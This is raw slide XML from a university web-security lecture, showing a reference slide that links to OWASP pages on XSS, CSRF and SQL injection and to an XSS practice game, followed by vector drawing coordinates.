            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 17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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="object 15" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="1533220"/>
            <a:ext cx="9069705" cy="3522345"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="1446530" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Cross</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-85" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Site</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-75" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-80" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>(XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-85" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacks </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://owasp.org/www-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>community/attacks/xss/</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="4124325" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Gamified</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-60" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-85" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>practice </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://xss-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>game.appspot.com/</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="1522095" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Cross</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-95" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Site</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-80" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Request</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-80" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Forgery</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-80" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>(CSRF)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-80" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacks </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://owasp.org/www-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>community/attacks/csrf</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-65" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-70" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacks</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="241300">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://owasp.org/www-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>community/attacks/SQL_Injection</a:t>
            </a:r>
            <a:endParaRPr sz="2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8606028" y="710691"/>
            <a:ext cx="2734310" cy="2474595"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2734309" h="2474595">
                <a:moveTo>
                  <a:pt x="371856" y="2255774"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="328142" y="2238514"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="290258" y="2206929"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="257644" y="2166010"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="229755" y="2120735"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="206032" y="2076107"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="185928" y="2037080"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170675" y="2078062"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="147231" y="2117179"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117005" y="2154478"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81445" y="2189988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41960" y="2223744"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2255774"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45173" y="2279789"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85877" y="2308021"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121196" y="2341029"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="150253" y="2379395"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="172123" y="2423680"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="185928" y="2474468"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202577" y="2429141"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="227939" y="2383294"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="259791" y="2339987"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="295871" y="2302256"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="333971" y="2273173"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="371856" y="2255774"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="2734309" h="2474595">
                <a:moveTo>
                  <a:pt x="2734056" y="393700"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2698051" y="381000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2660510" y="381000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2621305" y="368300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2580360" y="342900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2537536" y="330200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2492756" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2466695" y="290677"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2466695" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2462606" y="1574800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2456904" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2452903" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2453894" y="1701800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2391003" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2334247" y="1752600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2282660" y="1765300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2235301" y="1790700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2191245" y="1803400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2149551" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2109266" y="1828800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1988794" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1907755" y="1930400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1865503" y="1943100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821014" y="1955800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1773491" y="1968500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1722132" y="1993900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1666113" y="2019300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1604645" y="2057400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1538236" y="2082800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1482686" y="2120900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1435760" y="2133600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1395222" y="2146300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1358811" y="2159000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1289494" y="2184400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1252093" y="2197100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1213586" y="2184400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1168273" y="2171700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1118184" y="2146300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="959739" y="2070100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="910983" y="2057400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="867676" y="2044700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="831850" y="2032000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="798512" y="2019300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="761441" y="2006600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="720801" y="1993900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="676770" y="1968500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="629513" y="1943100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="579196" y="1917700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="525995" y="1892300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411607" y="1866900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="409181" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="409295" y="1765300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="410616" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411822" y="1689100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411734" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411645" y="1638300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411607" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="452335" y="1651000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="499732" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="551472" y="1689100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="658710" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="709561" y="1752600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="755472" y="1778000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="794131" y="1790700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="829818" y="1803400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="868426" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="909955" y="1841500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="954417" y="1854200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1001801" y="1879600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1052144" y="1892300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1105420" y="1917700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1161669" y="1943100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1218158" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1288796" y="1879600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1328813" y="1866900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1371638" y="1866900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1417027" y="1854200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1464741" y="1841500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1514538" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1566151" y="1790700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1619377" y="1752600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1647698" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1676031" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1727847" y="1701800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1775498" y="1676400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1819694" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1861121" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1900466" y="1651000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2013038" y="1612900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2051050" y="1587500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2136521" y="1536700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2267051" y="1498600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2358821" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2406942" y="1447800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2456942" y="1422400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2465908" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2466695" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2466695" y="290677"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2460904" y="287540"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2460904" y="558800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2455634" y="596900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449893" y="647700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449792" y="660400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449703" y="673100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449614" y="685800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449512" y="698500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449423" y="711200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2459990" y="762000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2409482" y="787400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382342" y="794016"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382342" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382266" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382189" y="1066800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382113" y="1079500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382050" y="1092200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2376881" y="1130300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372017" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372144" y="1193800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372258" y="1206500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372372" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372487" y="1231900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372614" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2369566" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2325395" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2282342" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2154644" y="1333500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2065705" y="1358900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2018576" y="1384300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1969008" y="1409700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1924989" y="1447800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1884095" y="1460500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1845284" y="1485900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1730870" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1689950" y="1536700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1645920" y="1549400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1597710" y="1562100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1544320" y="1587500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1478978" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1422679" y="1651000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1373505" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1329537" y="1676400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1288884" y="1701800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1209840" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1167638" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1105052" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1054709" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1013269" y="1701800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="977430" y="1689100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="943864" y="1676400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="909243" y="1651000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="870229" y="1625600"/>
